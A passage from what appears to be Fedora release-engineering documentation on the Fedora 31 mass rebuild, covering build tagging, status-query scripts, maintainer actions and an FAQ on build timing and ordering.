'latest' precedent when it finishes. Asking rel-eng to kill the
scripted build will typically be enough.

### Build Tagging

Once the rebuild script has finished, another [script](https://pagure.io/releng/blob/master/f/scripts/mass-tag.py) will run to tag the builds into f31. This script will check that a newer build hasn't been done or started in f31 since the scripted rebuild was submitted. This will protect against the scripted rebuild overriding an even newer build done while the scripted rebuild was waiting in the background.

### Status Query

Release Engineering has developed a [script](https://pagure.io/releng/blob/master/f/scripts/need-rebuild.py) to query f31
and report on packages that have yet to be rebuilt. Results of these
queries will be delivered to various places, yet to be determined,
broken down by maintainer for easier discovery of work needed.

## Maintainer Actions

* Maintainers can help this effort by ensuring **rpmdev-bumpspec** correctly bumps your package's spec files.
* Maintainers should ensure that their packages currently build from source.
* Maintainers should ensure that there are no unwanted changes committed to git but not built yet.

## Frequently Asked Questions

### When will my own build "count" for the rebuild?

After the last piece needed for the mass rebuild a golang build was put into place, a build done by a maintainer will "count" toward the rebuild. 2019-07-24 09:40:00 is the UTC time that builds count from

### Will the rebuilds be ordered?

Currently there is no plan to logically order the rebuilds based on deps. The ordering will be alphanumerical based on package name. There are no planned ABI/soname changes that would require logical build ordering. Further, all the builds will be kept in a special tag (f31-rebuild) until the whole run is done, and then they will be tagged into f31 in one shot to minimize the shuffle of buildroot contents during the rebuilds.
